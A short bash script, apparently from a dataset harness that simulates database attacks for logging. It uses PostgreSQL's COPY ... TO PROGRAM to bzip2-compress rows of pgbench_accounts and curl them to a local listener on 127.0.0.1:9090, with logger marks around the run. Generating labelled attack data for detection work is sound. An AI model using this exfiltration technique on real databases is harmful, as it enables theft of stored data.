#!/bin/bash
echo "Simulating Data Exfiltration Attack (bzip2 + curl)..."
/dataset_workspace/logger.sh mark_attack "attack_exfil_bzip2_curl" start
psql -U postgres -d casce_tpcb -c "COPY (SELECT * FROM pgbench_accounts LIMIT 10) TO PROGRAM 'bzip2 > /tmp/exfil_bzip2_curl.dat && curl -s -X POST -d @/tmp/exfil_bzip2_curl.dat http://127.0.0.1:9090 2>/dev/null || true';"
/dataset_workspace/logger.sh mark_attack "attack_exfil_bzip2_curl" end
